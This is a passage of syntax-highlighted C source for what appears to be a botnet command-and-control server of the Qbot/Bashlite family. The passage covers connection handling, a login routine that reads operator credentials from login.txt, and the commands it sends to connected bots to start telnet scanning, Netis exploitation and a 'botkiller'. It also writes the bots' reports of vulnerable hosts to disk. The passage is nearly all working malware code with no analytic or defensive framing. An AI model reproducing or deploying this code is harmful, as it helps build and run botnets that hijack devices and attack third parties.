class="string">&quot;35m&quot;</span>, <span class="string">&quot;36m&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> *ports[] = &#123;<span class="string">&quot;80&quot;</span>, <span class="string">&quot;3075&quot;</span>, <span class="string">&quot;443&quot;</span>, <span class="string">&quot;22&quot;</span>, <span class="string">&quot;53&quot;</span>, <span class="string">&quot;3074&quot;</span>, <span class="string">&quot;23&quot;</span>, <span class="string">&quot;8080&quot;</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">account</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> id[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">account</span> <span class="title">accounts</span>[50];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">clientdata_t</span> &#123;</span></span><br><span class="line"><span class="keyword">uint32_t</span> ip;</span><br><span class="line"><span class="keyword">char</span> build[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">char</span> connected;</span><br><span class="line">&#125; clients[MAXFDS];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">telnetdata_t</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> connected;</span><br><span class="line"><span class="keyword">int</span> hax;</span><br><span class="line">&#125; managements[MAXFDS];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> FILE *telFD;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> FILE *fileFD;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> epollFD = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> listenFD = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> managesConnected = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> TELFound = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> scannerreport;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fdgets</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *buffer, <span class="keyword">int</span> bufferSize, <span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> total = <span class="number">0</span>, got = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(got == <span class="number">1</span> &amp;&amp; total &lt; bufferSize &amp;&amp; *(buffer + total - <span class="number">1</span>) != <span class="string">&#x27;\n&#x27;</span>) &#123; got = read(fd, buffer + total, <span class="number">1</span>); total++; &#125;</span><br><span class="line"><span class="keyword">return</span> got;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trim</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> begin = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> end = <span class="built_in">strlen</span>(str) - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">isspace</span>(str[begin])) begin++;</span><br><span class="line"><span class="keyword">while</span> ((end &gt;= begin) &amp;&amp; <span class="built_in">isspace</span>(str[end])) end--;</span><br><span class="line"><span class="keyword">for</span> (i = begin; i &lt;= end; i++) str[i - begin] = str[i];</span><br><span class="line">str[i - begin] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">make_socket_non_blocking</span> <span class="params">(<span class="keyword">int</span> sfd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flags, s;</span><br><span class="line">flags = fcntl (sfd, F_GETFL, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (flags == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror (<span class="string">&quot;fcntl&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">flags |= O_NONBLOCK;</span><br><span class="line">s = fcntl (sfd, F_SETFL, flags);</span><br><span class="line"><span class="keyword">if</span> (s == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror (<span class="string">&quot;fcntl&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> hackz;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">create_and_bind</span> <span class="params">(<span class="keyword">char</span> *port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> <span class="title">hints</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> *<span class="title">result</span>, *<span class="title">rp</span>;</span></span><br><span class="line"><span class="keyword">int</span> s, sfd;</span><br><span class="line"><span class="built_in">memset</span> (&amp;hints, <span class="number">0</span>, <span class="keyword">sizeof</span> (struct addrinfo));</span><br><span class="line">hints.ai_family = AF_UNSPEC;</span><br><span class="line">hints.ai_socktype = SOCK_STREAM;</span><br><span class="line">hints.ai_flags = AI_PASSIVE;</span><br><span class="line">s = getaddrinfo (<span class="literal">NULL</span>, port, &amp;hints, &amp;result);</span><br><span class="line"><span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;getaddrinfo: %s\n&quot;</span>, gai_strerror (s));</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (rp = result; rp != <span class="literal">NULL</span>; rp = rp-&gt;ai_next)</span><br><span class="line">&#123;</span><br><span class="line">sfd = socket (rp-&gt;ai_family, rp-&gt;ai_socktype, rp-&gt;ai_protocol);</span><br><span class="line"><span class="keyword">if</span> (sfd == <span class="number">-1</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">int</span> yes = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &amp;yes, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) == <span class="number">-1</span> ) perror(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line">s = bind (sfd, rp-&gt;ai_addr, rp-&gt;ai_addrlen);</span><br><span class="line"><span class="keyword">if</span> (s == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">close (sfd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (rp == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;Could not bind\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">freeaddrinfo (result);</span><br><span class="line"><span class="keyword">return</span> sfd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">broadcast</span><span class="params">(<span class="keyword">char</span> *msg, <span class="keyword">int</span> us, <span class="keyword">char</span> *sender)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sendMGM = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(msg, <span class="string">&quot;PING&quot;</span>) == <span class="number">0</span>) sendMGM = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *wot = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(msg) + <span class="number">10</span>);</span><br><span class="line"><span class="built_in">memset</span>(wot, <span class="number">0</span>, <span class="built_in">strlen</span>(msg) + <span class="number">10</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(wot, msg);</span><br><span class="line">trim(wot);</span><br><span class="line"><span class="keyword">time_t</span> rawtime;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tm</span> * <span class="title">timeinfo</span>;</span></span><br><span class="line">time(&amp;rawtime);</span><br><span class="line">timeinfo = localtime(&amp;rawtime);</span><br><span class="line"><span class="keyword">char</span> *timestamp = asctime(timeinfo);</span><br><span class="line">trim(timestamp);</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MAXFDS; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i == us || (!clients[i].connected &amp;&amp; (sendMGM == <span class="number">0</span> || !managements[i].connected))) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(sendMGM &amp;&amp; managements[i].connected)</span><br><span class="line">&#123;</span><br><span class="line">send(i, <span class="string">&quot;\x1b[36m&quot;</span>, <span class="number">5</span>, MSG_NOSIGNAL);</span><br><span class="line">send(i, sender, <span class="built_in">strlen</span>(sender), MSG_NOSIGNAL);</span><br><span class="line">send(i, <span class="string">&quot;: &quot;</span>, <span class="number">2</span>, MSG_NOSIGNAL);</span><br><span class="line">&#125;</span><br><span class="line">send(i, msg, <span class="built_in">strlen</span>(msg), MSG_NOSIGNAL);</span><br><span class="line"><span class="keyword">char</span> *lol[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">char</span> usernames[<span class="number">80</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(lol, <span class="string">&quot;\r\n\x1b[%s~$ \x1b[37m&quot;</span>, colorCodes[rand() % <span class="number">6</span>]);</span><br><span class="line"><span class="keyword">if</span>(sendMGM &amp;&amp; managements[i].connected) send(i, lol, <span class="built_in">strlen</span>(lol), MSG_NOSIGNAL);</span><br><span class="line"><span class="keyword">else</span> send(i, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>, MSG_NOSIGNAL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(wot);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">epollEventLoop</span><span class="params">(<span class="keyword">void</span> *useless)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> *<span class="title">events</span>;</span></span><br><span class="line"><span class="keyword">int</span> s;</span><br><span class="line">events = <span class="built_in">calloc</span> (MAXFDS, <span class="keyword">sizeof</span> event);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> n, i;</span><br><span class="line">n = epoll_wait (epollFD, events, MAXFDS, <span class="number">-1</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((events[i].events &amp; EPOLLERR) || (events[i].events &amp; EPOLLHUP) || (!(events[i].events &amp; EPOLLIN)))</span><br><span class="line">&#123;</span><br><span class="line">clients[events[i].data.fd].connected = <span class="number">0</span>;</span><br><span class="line">close(events[i].data.fd);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (listenFD == events[i].data.fd)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">struct sockaddr in_addr;</span><br><span class="line"><span class="keyword">socklen_t</span> in_len;</span><br><span class="line"><span class="keyword">int</span> infd, ipIndex;</span><br><span class="line">in_len = <span class="keyword">sizeof</span> in_addr;</span><br><span class="line">infd = accept (listenFD, &amp;in_addr, &amp;in_len);</span><br><span class="line"><span class="keyword">if</span> (infd == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((errno == EAGAIN) || (errno == EWOULDBLOCK)) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">perror (<span class="string">&quot;accept&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">clients[infd].ip = ((struct sockaddr_in *)&amp;in_addr)-&gt;sin_addr.s_addr;</span><br><span class="line"><span class="keyword">int</span> dup = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">for</span>(ipIndex = <span class="number">0</span>; ipIndex &lt; MAXFDS; ipIndex++) &#123;</span><br><span class="line">					<span class="keyword">if</span>(!clients[ipIndex].connected || ipIndex == infd) <span class="keyword">continue</span>;</span><br><span class="line">					<span class="keyword">if</span>(clients[ipIndex].ip == clients[infd].ip == clients[infd].ip) &#123;</span><br><span class="line">						dup = <span class="number">1</span>;</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;&#125;</span><br><span class="line">				<span class="keyword">if</span>(dup) &#123;</span><br><span class="line">					<span class="keyword">if</span>(send(infd, <span class="string">&quot;DUP\n&quot;</span>, <span class="number">13</span>, MSG_NOSIGNAL) == <span class="number">-1</span>) &#123; close(infd); <span class="keyword">continue</span>; &#125;</span><br><span class="line">					<span class="keyword">if</span>(send(infd, <span class="string">&quot;!* DUP\n&quot;</span>, <span class="number">13</span>, MSG_NOSIGNAL) == <span class="number">-1</span>) &#123; close(infd); <span class="keyword">continue</span>; &#125;</span><br><span class="line">					<span class="keyword">if</span>(send(infd, <span class="string">&quot;!* LOLNOGTFO\n&quot;</span>, <span class="number">13</span>, MSG_NOSIGNAL) == <span class="number">-1</span>) &#123; close(infd); <span class="keyword">continue</span>; &#125;</span><br><span class="line">					close(infd);</span><br><span class="line">					</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = make_socket_non_blocking (infd);</span><br><span class="line"><span class="keyword">if</span> (s == <span class="number">-1</span>) &#123; close(infd); <span class="keyword">break</span>; &#125;</span><br><span class="line">event.data.fd = infd;</span><br><span class="line">event.events = EPOLLIN | EPOLLET;</span><br><span class="line">s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &amp;event);</span><br><span class="line"><span class="keyword">if</span> (s == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror (<span class="string">&quot;epoll_ctl&quot;</span>);</span><br><span class="line">close(infd);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">clients[infd].connected = <span class="number">1</span>;</span><br><span class="line">send(infd, <span class="string">&quot;!* QTELNET 1500 1\r\n&quot;</span>, <span class="number">19</span>, MSG_NOSIGNAL);</span><br><span class="line">send(infd, <span class="string">&quot;!* NETIS ON\r\n&quot;</span>, <span class="number">13</span>, MSG_NOSIGNAL);</span><br><span class="line">send(infd, <span class="string">&quot;!* BOTKILLER ON\r\n&quot;</span>, <span class="number">17</span>, MSG_NOSIGNAL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> thefd = events[i].data.fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">clientdata_t</span> *<span class="title">client</span> =</span> &amp;(clients[thefd]);</span><br><span class="line"><span class="keyword">int</span> done = <span class="number">0</span>;</span><br><span class="line">client-&gt;connected = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> cheats;</span><br><span class="line"><span class="keyword">ssize_t</span> count;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">2048</span>];</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span> buf);</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span> buf) &amp;&amp; (count = fdgets(buf, <span class="keyword">sizeof</span> buf, thefd)) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;\n&quot;</span>) == <span class="literal">NULL</span>) &#123; done = <span class="number">1</span>; <span class="keyword">break</span>; &#125;</span><br><span class="line">trim(buf);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(buf, <span class="string">&quot;PING&quot;</span>) == <span class="number">0</span>) <span class="comment">// basic IRC-like ping/pong challenge/response to see if server is alive</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(send(thefd, <span class="string">&quot;PONG\n&quot;</span>, <span class="number">5</span>, MSG_NOSIGNAL) == <span class="number">-1</span>) &#123; done = <span class="number">1</span>; <span class="keyword">break</span>; &#125; <span class="comment">// response</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;REPORT &quot;</span>) == buf) <span class="comment">// received a report of a vulnerable system from a scan</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> *line = <span class="built_in">strstr</span>(buf, <span class="string">&quot;REPORT &quot;</span>) + <span class="number">7</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(telFD, <span class="string">&quot;%s\n&quot;</span>, line); <span class="comment">// let&#x27;s write it out to disk without checking what it is!</span></span><br><span class="line">fflush(telFD);</span><br><span class="line">TELFound++;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;PROBING&quot;</span>) == buf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> *line = <span class="built_in">strstr</span>(buf, <span class="string">&quot;PROBING&quot;</span>);</span><br><span class="line">scannerreport = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;REMOVING PROBE&quot;</span>) == buf)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> *line = <span class="built_in">strstr</span>(buf, <span class="string">&quot;REMOVING PROBE&quot;</span>);</span><br><span class="line">scannerreport = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(buf, <span class="string">&quot;PONG&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\&quot;%s\&quot;\n&quot;</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (count == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (errno != EAGAIN)</span><br><span class="line">&#123;</span><br><span class="line">done = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">done = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (done)</span><br><span class="line">&#123;</span><br><span class="line">client-&gt;connected = <span class="number">0</span>;</span><br><span class="line">close(thefd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">clientsConnected</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, total = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MAXFDS; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!clients[i].connected) <span class="keyword">continue</span>;</span><br><span class="line">total++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">titleWriter</span><span class="params">(<span class="keyword">void</span> *sock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> thefd = (<span class="keyword">int</span>)sock;</span><br><span class="line"><span class="keyword">char</span> <span class="built_in">string</span>[<span class="number">2048</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(<span class="built_in">string</span>, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(<span class="built_in">string</span>, <span class="string">&quot;%c]0;Loaded: %d %c&quot;</span>, <span class="string">&#x27;\033&#x27;</span>, managesConnected, <span class="string">&#x27;\007&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(send(thefd, <span class="built_in">string</span>, <span class="built_in">strlen</span>(<span class="built_in">string</span>), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Search_in_File</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">int</span> line_num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> find_result = <span class="number">0</span>, find_line=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> temp[<span class="number">512</span>];</span><br><span class="line"><span class="keyword">if</span>((fp = fopen(<span class="string">&quot;login.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(fgets(temp, <span class="number">512</span>, fp) != <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((<span class="built_in">strstr</span>(temp, str)) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">find_result++;</span><br><span class="line">find_line = line_num;</span><br><span class="line">&#125;</span><br><span class="line">line_num++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(fp)</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="keyword">if</span>(find_result == <span class="number">0</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> find_line;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">telnetWorker</span><span class="params">(<span class="keyword">void</span> *sock)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> usernames[<span class="number">80</span>];</span><br><span class="line"><span class="keyword">int</span> thefd = (<span class="keyword">int</span>)sock;</span><br><span class="line"><span class="keyword">int</span> find_line;</span><br><span class="line">managesConnected++;</span><br><span class="line"><span class="keyword">pthread_t</span> title;</span><br><span class="line"><span class="keyword">char</span> counter[<span class="number">2048</span>];</span><br><span class="line"><span class="built_in">memset</span>(counter, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">2048</span>];</span><br><span class="line"><span class="keyword">char</span>* nickstring;</span><br><span class="line"><span class="keyword">char</span>* username;</span><br><span class="line"><span class="keyword">char</span>* password;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span> buf);</span><br><span class="line"><span class="keyword">char</span> hackz[<span class="number">2048</span>];</span><br><span class="line"><span class="built_in">memset</span>(hackz, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> c;</span><br><span class="line">fp=fopen(<span class="string">&quot;login.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); <span class="comment">// format: user pass</span></span><br><span class="line"><span class="keyword">while</span>(!feof(fp))</span><br><span class="line">&#123;</span><br><span class="line">c=fgetc(fp);</span><br><span class="line">++i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">rewind(fp);</span><br><span class="line"><span class="keyword">while</span>(j!=i<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s %s&quot;</span>, accounts[j].id, accounts[j].password);</span><br><span class="line">++j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sprintf</span>(hackz, <span class="string">&quot;\x1b[%sUsername:\x1b[%s &quot;</span>, colorCodes[(rand() % <span class="number">6</span>)], colorCodes[(rand() % <span class="number">2</span>)]);</span><br><span class="line"><span class="keyword">if</span> (send(thefd, hackz, <span class="built_in">strlen</span>(hackz), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line"><span class="keyword">if</span>(fdgets(buf, <span class="keyword">sizeof</span> buf, thefd) &lt; <span class="number">1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">trim(buf);</span><br><span class="line"><span class="built_in">sprintf</span>(usernames, buf);</span><br><span class="line">nickstring = (<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">find_line = Search_in_File(nickstring);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(nickstring, accounts[find_line].id) == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(hackz, <span class="string">&quot;\x1b[%sPassword:\x1b[30m &quot;</span>, colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="keyword">if</span> (send(thefd, hackz, <span class="built_in">strlen</span>(hackz), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line"><span class="keyword">if</span>(fdgets(buf, <span class="keyword">sizeof</span> buf, thefd) &lt; <span class="number">1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">trim(buf);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(buf, accounts[find_line].password) != <span class="number">0</span>) <span class="keyword">goto</span> failed;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">2048</span>);</span><br><span class="line"><span class="keyword">goto</span> hacker;</span><br><span class="line">&#125;</span><br><span class="line">failed:</span><br><span class="line"><span class="keyword">if</span>(send(thefd, <span class="string">&quot;\033[1A&quot;</span>, <span class="number">5</span>, MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line"><span class="keyword">if</span>(send(thefd, <span class="string">&quot;\x1b[36m Attempting To Log IP Address\r\n&quot;</span>, <span class="number">44</span>, MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span>(send(thefd, <span class="string">&quot;\x1b[36m Successfully Logged Bye Bitch\r\n&quot;</span>, <span class="number">44</span>, MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line">sleep(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">goto</span> end;</span><br><span class="line">hacker:</span><br><span class="line">pthread_create(&amp;title, <span class="literal">NULL</span>, &amp;titleWriter, sock);</span><br><span class="line"><span class="built_in">sprintf</span>(hackz, <span class="string">&quot;\r\n       \x1b[%s\r\n&quot;</span>, colorCodes[(rand() % <span class="number">6</span>)]);</span><br><span class="line"><span class="keyword">if</span>(send(thefd, hackz, <span class="built_in">strlen</span>(hackz), MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;</span><br><span class="line"><span class="keyword">if</span> (send(thefd, <span class="string">&quot;\033[1A\033[2J\033[1;1H&quot;</span>, <span class="number">14</span>, MSG_NOSIGNAL) == <span class="number">-1</span>) <span class="keyword">goto</span> end;<span class="comment">//im a hacker hehehe</span></span><br><span class="line">		<span class="keyword">char</span> ascii_banner_line1 [<span class="number">5000</span>];</span><br><span class="line">		<span class="keyword">char</span> ascii_banner_line2 [<span class="number">5000</span>];</span><br><span class="line">		<span class="keyword">char</span> ascii_banner_line3 [<span class="number">5000</span>];</span><br><span class="line">		<span class="keyword">char</span> ascii_banner_line4 [<span class="number">5000</span>];</span><br><span class="line">		<span class="keyword">char</span> ascii_banner_line5 [<span class="number">5000</span>];</span><br><span class="line">		<span class="keyword">char</span> ascii_banner_line6 [<span class="number">5000</span>];</span><br><span class="line">		<span class="keyword">char</span> 